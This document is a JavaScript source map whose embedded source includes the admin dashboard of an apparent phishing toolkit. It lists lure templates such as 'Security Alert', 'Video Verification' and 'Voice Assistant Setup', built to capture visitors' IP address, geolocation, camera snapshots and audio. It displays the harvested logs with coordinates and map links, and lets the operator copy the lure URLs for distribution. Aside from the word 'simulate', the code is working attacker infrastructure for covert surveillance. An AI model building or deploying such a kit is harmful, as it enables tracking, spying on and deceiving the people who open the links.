{
  "version": 3,
  "sources": [],
  "sections": [
    {"offset": {"line": 7, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/components/ui/card.tsx"],"sourcesContent":["import * as React from \"react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Card = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\n      \"rounded-lg border bg-card text-card-foreground shadow-sm\",\n      className\n    )}\n    {...props}\n  />\n))\nCard.displayName = \"Card\"\n\nconst CardHeader = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\"flex flex-col space-y-1.5 p-6\", className)}\n    {...props}\n  />\n))\nCardHeader.displayName = \"CardHeader\"\n\nconst CardTitle = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\n      \"text-2xl font-semibold leading-none tracking-tight\",\n      className\n    )}\n    {...props}\n  />\n))\nCardTitle.displayName = \"CardTitle\"\n\nconst CardDescription = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\"text-sm text-muted-foreground\", className)}\n    {...props}\n  />\n))\nCardDescription.displayName = \"CardDescription\"\n\nconst CardContent = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div ref={ref} className={cn(\"p-6 pt-0\", className)} {...props} />\n))\nCardContent.displayName = \"CardContent\"\n\nconst CardFooter = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\"flex items-center p-6 pt-0\", className)}\n    {...props}\n  />\n))\nCardFooter.displayName = \"CardFooter\"\n\nexport { Card, CardHeader, CardFooter, CardTitle, CardDescription, CardContent }\n"],"names":[],"mappings":";;;;;;;;;AAAA;AAEA;;;;AAEA,MAAM,qBAAO,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAG1B,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QACC,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EACV,4DACA;QAED,GAAG,KAAK;;;;;;AAGb,KAAK,WAAW,GAAG;AAEnB,MAAM,2BAAa,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAGhC,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QACC,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EAAE,iCAAiC;QAC9C,GAAG,KAAK;;;;;;AAGb,WAAW,WAAW,GAAG;AAEzB,MAAM,0BAAY,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAG/B,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QACC,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EACV,sDACA;QAED,GAAG,KAAK;;;;;;AAGb,UAAU,WAAW,GAAG;AAExB,MAAM,gCAAkB,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAGrC,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QACC,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EAAE,iCAAiC;QAC9C,GAAG,KAAK;;;;;;AAGb,gBAAgB,WAAW,GAAG;AAE9B,MAAM,4BAAc,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAGjC,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QAAI,KAAK;QAAK,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EAAE,YAAY;QAAa,GAAG,KAAK;;;;;;AAEhE,YAAY,WAAW,GAAG;AAE1B,MAAM,2BAAa,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAGhC,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QACC,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EAAE,8BAA8B;QAC3C,GAAG,KAAK;;;;;;AAGb,WAAW,WAAW,GAAG","debugId":null}},
    {"offset": {"line": 88, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/components/dashboard/PhishingLinkCard.tsx"],"sourcesContent":["\n\"use client\";\nimport type { LucideIcon } from 'lucide-react';\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Button } from '@/components/ui/button';\nimport { Copy, ExternalLink } from 'lucide-react'; // Changed ExternalLink to Copy\nimport { useToast } from '@/hooks/use-toast'; // Added useToast\n\ninterface PhishingLink {\n  id: string;\n  name: string;\n  url: string;\n}\n\ninterface PhishingLinkCardProps {\n  title: string;\n  description: string;\n  Icon: LucideIcon;\n  links: PhishingLink[];\n  cardColorClass?: string; // e.g. bg-blue-100 border-blue-300\n}\n\nexport function PhishingLinkCard({ title, description, Icon, links, cardColorClass = \"bg-card\" }: PhishingLinkCardProps) {\n  const { toast } = useToast();\n\n  const handleCopyLink = async (url: string) => {\n    try {\n      const fullUrl = `${window.location.origin}${url}`;\n      await navigator.clipboard.writeText(fullUrl);\n      toast({\n        title: \"Link Copied!\",\n        description: \"The phishing link has been copied to your clipboard.\",\n        variant: \"default\",\n      });\n    } catch (err) {\n      console.error('Failed to copy: ', err);\n      toast({\n        title: \"Copy Failed\",\n        description: \"Could not copy the link to your clipboard.\",\n        variant: \"destructive\",\n      });\n    }\n  };\n\n  return (\n    <Card className={`shadow-lg hover:shadow-xl transition-shadow ${cardColorClass}`}>\n      <CardHeader className=\"flex flex-row items-center justify-between space-y-0 pb-2\">\n        <CardTitle className=\"text-xl font-semibold\">{title}</CardTitle>\n        <Icon className=\"h-6 w-6 text-muted-foreground\" />\n      </CardHeader>\n      <CardContent>\n        <CardDescription className=\"mb-4\">{description}</CardDescription>\n        <div className=\"space-y-2\">\n          {links.map((link) => (\n            <Button\n              key={link.id}\n              variant=\"outline\"\n              className=\"w-full justify-start\"\n              onClick={() => handleCopyLink(link.url)}\n            >\n              <Copy className=\"mr-2 h-4 w-4\" /> {/* Changed icon to Copy */}\n              {link.name}\n            </Button>\n          ))}\n        </div>\n      </CardContent>\n    </Card>\n  );\n}\n"],"names":[],"mappings":";;;;AAGA;AACA;AACA,gVAAmD,+BAA+B;AAClF,uNAA8C,iBAAiB;AAL/D;;;;;;AAqBO,SAAS,iBAAiB,EAAE,KAAK,EAAE,WAAW,EAAE,IAAI,EAAE,KAAK,EAAE,iBAAiB,SAAS,EAAyB;IACrH,MAAM,EAAE,KAAK,EAAE,GAAG,CAAA,GAAA,4HAAA,CAAA,WAAQ,AAAD;IAEzB,MAAM,iBAAiB,OAAO;QAC5B,IAAI;YACF,MAAM,UAAU,GAAG,OAAO,QAAQ,CAAC,MAAM,GAAG,KAAK;YACjD,MAAM,UAAU,SAAS,CAAC,SAAS,CAAC;YACpC,MAAM;gBACJ,OAAO;gBACP,aAAa;gBACb,SAAS;YACX;QACF,EAAE,OAAO,KAAK;YACZ,QAAQ,KAAK,CAAC,oBAAoB;YAClC,MAAM;gBACJ,OAAO;gBACP,aAAa;gBACb,SAAS;YACX;QACF;IACF;IAEA,qBACE,8OAAC,gIAAA,CAAA,OAAI;QAAC,WAAW,CAAC,4CAA4C,EAAE,gBAAgB;;0BAC9E,8OAAC,gIAAA,CAAA,aAAU;gBAAC,WAAU;;kCACpB,8OAAC,gIAAA,CAAA,YAAS;wBAAC,WAAU;kCAAyB;;;;;;kCAC9C,8OAAC;wBAAK,WAAU;;;;;;;;;;;;0BAElB,8OAAC,gIAAA,CAAA,cAAW;;kCACV,8OAAC,gIAAA,CAAA,kBAAe;wBAAC,WAAU;kCAAQ;;;;;;kCACnC,8OAAC;wBAAI,WAAU;kCACZ,MAAM,GAAG,CAAC,CAAC,qBACV,8OAAC,kIAAA,CAAA,SAAM;gCAEL,SAAQ;gCACR,WAAU;gCACV,SAAS,IAAM,eAAe,KAAK,GAAG;;kDAEtC,8OAAC,kMAAA,CAAA,OAAI;wCAAC,WAAU;;;;;;oCAAiB;oCAChC,KAAK,IAAI;;+BANL,KAAK,EAAE;;;;;;;;;;;;;;;;;;;;;;AAa1B","debugId":null}},
    {"offset": {"line": 205, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/components/ui/scroll-area.tsx"],"sourcesContent":["\"use client\"\n\nimport * as React from \"react\"\nimport * as ScrollAreaPrimitive from \"@radix-ui/react-scroll-area\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst ScrollArea = React.forwardRef<\n  React.ElementRef<typeof ScrollAreaPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof ScrollAreaPrimitive.Root>\n>(({ className, children, ...props }, ref) => (\n  <ScrollAreaPrimitive.Root\n    ref={ref}\n    className={cn(\"relative overflow-hidden\", className)}\n    {...props}\n  >\n    <ScrollAreaPrimitive.Viewport className=\"h-full w-full rounded-[inherit]\">\n      {children}\n    </ScrollAreaPrimitive.Viewport>\n    <ScrollBar />\n    <ScrollAreaPrimitive.Corner />\n  </ScrollAreaPrimitive.Root>\n))\nScrollArea.displayName = ScrollAreaPrimitive.Root.displayName\n\nconst ScrollBar = React.forwardRef<\n  React.ElementRef<typeof ScrollAreaPrimitive.ScrollAreaScrollbar>,\n  React.ComponentPropsWithoutRef<typeof ScrollAreaPrimitive.ScrollAreaScrollbar>\n>(({ className, orientation = \"vertical\", ...props }, ref) => (\n  <ScrollAreaPrimitive.ScrollAreaScrollbar\n    ref={ref}\n    orientation={orientation}\n    className={cn(\n      \"flex touch-none select-none transition-colors\",\n      orientation === \"vertical\" &&\n        \"h-full w-2.5 border-l border-l-transparent p-[1px]\",\n      orientation === \"horizontal\" &&\n        \"h-2.5 flex-col border-t border-t-transparent p-[1px]\",\n      className\n    )}\n    {...props}\n  >\n    <ScrollAreaPrimitive.ScrollAreaThumb className=\"relative flex-1 rounded-full bg-border\" />\n  </ScrollAreaPrimitive.ScrollAreaScrollbar>\n))\nScrollBar.displayName = ScrollAreaPrimitive.ScrollAreaScrollbar.displayName\n\nexport { ScrollArea, ScrollBar }\n"],"names":[],"mappings":";;;;;AAEA;AACA;AAEA;AALA;;;;;AAOA,MAAM,2BAAa,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAGhC,CAAC,EAAE,SAAS,EAAE,QAAQ,EAAE,GAAG,OAAO,EAAE,oBACpC,8OAAC,0KAAA,CAAA,OAAwB;QACvB,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EAAE,4BAA4B;QACzC,GAAG,KAAK;;0BAET,8OAAC,0KAAA,CAAA,WAA4B;gBAAC,WAAU;0BACrC;;;;;;0BAEH,8OAAC;;;;;0BACD,8OAAC,0KAAA,CAAA,SAA0B;;;;;;;;;;;AAG/B,WAAW,WAAW,GAAG,0KAAA,CAAA,OAAwB,CAAC,WAAW;AAE7D,MAAM,0BAAY,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAG/B,CAAC,EAAE,SAAS,EAAE,cAAc,UAAU,EAAE,GAAG,OAAO,EAAE,oBACpD,8OAAC,0KAAA,CAAA,sBAAuC;QACtC,KAAK;QACL,aAAa;QACb,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EACV,iDACA,gBAAgB,cACd,sDACF,gBAAgB,gBACd,wDACF;QAED,GAAG,KAAK;kBAET,cAAA,8OAAC,0KAAA,CAAA,kBAAmC;YAAC,WAAU;;;;;;;;;;;AAGnD,UAAU,WAAW,GAAG,0KAAA,CAAA,sBAAuC,CAAC,WAAW","debugId":null}},
    {"offset": {"line": 273, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/app/admin/dashboard/page.tsx"],"sourcesContent":["\n\"use client\";\nimport { useEffect, useRef } from 'react';\nimport { useLogs } from '@/contexts/LogContext';\nimport { Button } from '@/components/ui/button';\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';\nimport { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';\nimport { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink } from 'lucide-react';\nimport type { LogEntry, LocationData, CameraData, AudioData } from '@/types';\nimport { ScrollArea } from '@/components/ui/scroll-area';\nimport Image from 'next/image';\nimport { useToast } from '@/hooks/use-toast';\nimport type { ToastActionElement } from '@/components/ui/toast'; // Correct import for ToastActionElement\nimport { ToastAction } from '@/components/ui/toast'; // Import ToastAction for creating the button\n\n\nconst phishingCategories = [\n  {\n    title: 'Location',\n    description: 'Templates designed to capture IP address and attempt geolocation.',\n    Icon: MapPin,\n    links: [\n      { id: 'nearby-deals', name: 'Template: Nearby Deals', url: '/phishing/location/nearby-deals' },\n      { id: 'security-alert', name: 'Template: Security Alert', url: '/phishing/location/security-alert' },\n      { id: 'content-unlock', name: 'Template: Content Unlock', url: '/phishing/location/content-unlock' },\n    ],\n    cardColorClass: \"bg-blue-50 border-blue-200\",\n  },\n  {\n    title: 'Camera Access',\n    description: 'Templates attempting to access the device camera.',\n    Icon: Camera,\n    links: [\n      { id: 'cam1', name: 'Template: Profile Photo Update', url: '/phishing/camera/profile-photo' },\n      { id: 'cam2', name: 'Template: Video Verification', url: '/phishing/camera/video-verification' },\n      { id: 'cam3', name: 'Template: AR Filter Test', url: '/phishing/camera/ar-filter' },\n    ],\n    cardColorClass: \"bg-green-50 border-green-200\",\n  },\n  {\n    title: 'Audio Access',\n    description: 'Templates simulating microphone access requests.',\n    Icon: Mic,\n    links: [\n      { id: 'aud1', name: 'Template: Voice Assistant Setup', url: '/phishing/audio/voice-assistant' },\n      { id: 'aud2', name: 'Template: Speech-to-Text Demo', url: '/phishing/audio/speech-to-text' },\n      { id: 'aud3', name: 'Template: Audio Quality Check', url: '/phishing/audio/quality-check' },\n    ],\n    cardColorClass: \"bg-purple-50 border-purple-200\",\n  },\n];\n\nexport default function DashboardPage() {\n  const { logs, clearLogs, isLoading } = useLogs();\n  const { toast } = useToast();\n  const previousLatestLogIdRef = useRef<string | null>(null);\n  const isInitialLoadRef = useRef(true);\n\n  useEffect(() => {\n    if (isLoading) return; \n\n    if (logs.length === 0) {\n      previousLatestLogIdRef.current = null; \n      if(isInitialLoadRef.current) isInitialLoadRef.current = false;\n      return;\n    }\n\n    const currentLatestLogId = logs[0].id;\n\n    if (isInitialLoadRef.current) {\n      previousLatestLogIdRef.current = currentLatestLogId;\n      isInitialLoadRef.current = false;\n      return; \n    }\n\n    if (currentLatestLogId !== previousLatestLogIdRef.current) {\n      const newLog = logs[0];\n      let toastTitle = \"New Data Captured!\";\n      let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;\n      let toastAction: ToastActionElement | undefined = undefined;\n\n      if (newLog.type === 'location') {\n        const locData = newLog.data as LocationData;\n        const city = locData.city || \"Unknown City\";\n        const country = locData.country || \"Unknown Country\";\n        toastTitle = \"Location Data Captured!\";\n        toastDescription = `From ${city}, ${country}. IP: ${newLog.ip}.`;\n        if (locData.latitude && locData.longitude) {\n          const mapsUrl = `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}`;\n          toastAction = (\n            <ToastAction\n              altText=\"Open in Maps\"\n              onClick={() => window.open(mapsUrl, '_blank')}\n            >\n              <ExternalLink className=\"mr-2 h-4 w-4\" /> Open in Maps\n            </ToastAction>\n          );\n        }\n      } else if (newLog.type === 'camera') {\n        toastTitle = \"Camera Snapshot Captured!\";\n        toastDescription = `Image captured from IP: ${newLog.ip}.`;\n      } else if (newLog.type === 'audio') {\n        toastTitle = \"Audio Capture Simulated!\";\n        toastDescription = `Audio event from IP: ${newLog.ip}.`;\n      } else if (newLog.type === 'generic') {\n        toastTitle = \"Page Visit Detected!\";\n        toastDescription = `Page: ${newLog.data.message?.split(': ')[1] || 'Unknown page'}, IP: ${newLog.ip}`;\n      }\n      \n      toast({\n        title: toastTitle,\n        description: toastDescription,\n        variant: \"default\",\n        action: toastAction,\n      });\n      previousLatestLogIdRef.current = currentLatestLogId;\n    }\n  }, [logs, isLoading, toast]);\n\n\n  const formatLogData = (data: any, type: LogEntry['type']): React.ReactNode => {\n    if (type === 'camera' && data && typeof data.imageUrl === 'string') {\n      const camData = data as CameraData;\n      return (\n        <div className=\"mt-2\">\n          <Image \n            src={camData.imageUrl} \n            alt=\"Captured image\" \n            width={160} \n            height={120} \n            className=\"rounded-md border object-contain\" \n          />\n          <details className=\"text-xs mt-1\">\n            <summary className=\"cursor-pointer text-muted-foreground hover:text-foreground\">Show Base64 Data (shortened in display)</summary>\n            <pre className=\"whitespace-pre-wrap break-all text-xs bg-muted/30 p-2 rounded-sm mt-1\">{JSON.stringify({ imageUrl: `${camData.imageUrl.substring(0,100)}... (truncated)` }, null, 2)}</pre>\n          </details>\n        </div>\n      );\n    }\n    if (type === 'location' && data) {\n        const locData = data as LocationData;\n        return <pre className=\"whitespace-pre-wrap break-all text-xs\">{JSON.stringify(locData, null, 2)}</pre>;\n    }\n    return <pre className=\"whitespace-pre-wrap break-all text-xs\">{JSON.stringify(data, null, 2)}</pre>;\n  };\n\n  return (\n    <div className=\"space-y-8\">\n      <Card className=\"shadow-lg\">\n        <CardHeader>\n          <CardTitle className=\"text-2xl flex items-center\">\n            <ListChecks className=\"mr-3 h-7 w-7 text-primary\" />\n            Captured Data Logs\n          </CardTitle>\n          <CardDescription>\n            View all data captured from phishing page interactions. This data updates in real-time.\n          </CardDescription>\n        </CardHeader>\n        <CardContent className=\"space-y-4\">\n          {isLoading ? (\n            <p>Loading logs...</p>\n          ) : logs.length === 0 ? (\n            <div className=\"text-center py-8 text-muted-foreground\">\n              <AlertTriangle className=\"mx-auto h-12 w-12 mb-2\" />\n              <p className=\"text-lg\">No logs captured yet.</p>\n              <p>Interact with the phishing templates to see data here.</p>\n            </div>\n          ) : (\n            <ScrollArea className=\"h-[400px] w-full rounded-md border p-4 bg-secondary/30\">\n              {logs.map(log => (\n                <div key={log.id} className=\"mb-4 p-3 rounded-md bg-card shadow-sm border\">\n                  <p className=\"font-semibold text-sm text-primary\">Log ID: <span className=\"font-mono text-xs\">{log.id}</span></p>\n                  <p className=\"text-xs text-muted-foreground\">Timestamp: {new Date(log.timestamp).toLocaleString()}</p>\n                  <p className=\"text-xs text-muted-foreground\">Type: <span className=\"font-medium capitalize\">{log.type}</span></p>\n                  <p className=\"text-xs text-muted-foreground\">IP: {log.ip}</p>\n                  <p className=\"text-xs text-muted-foreground\">User Agent: {log.userAgent}</p>\n                  <div className=\"mt-1 text-sm\">Data: {formatLogData(log.data, log.type)}</div>\n                </div>\n              ))}\n            </ScrollArea>\n          )}\n          <Button onClick={clearLogs} variant=\"destructive\" disabled={logs.length === 0}>\n            <Trash2 className=\"mr-2 h-4 w-4\" /> Delete All Logs\n          </Button>\n        </CardContent>\n      </Card>\n\n      <Card className=\"shadow-lg\">\n        <CardHeader>\n          <CardTitle className=\"text-2xl\">Phishing Page Templates</CardTitle>\n          <CardDescription>\n            Use these links to simulate phishing attempts and observe data capture. Each link opens in a new tab.\n          </CardDescription>\n        </CardHeader>\n        <CardContent className=\"grid gap-6 md:grid-cols-1 lg:grid-cols-3\">\n          {phishingCategories.map((category) => (\n            <PhishingLinkCard\n              key={category.title}\n              title={category.title}\n              description={category.description}\n              Icon={category.Icon}\n              links={category.links}\n              cardColorClass={category.cardColorClass}\n            />\n          ))}\n        </CardContent>\n      </Card>\n    </div>\n  );\n}\n"],"names":[],"mappings":"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","debugId":null}}]
}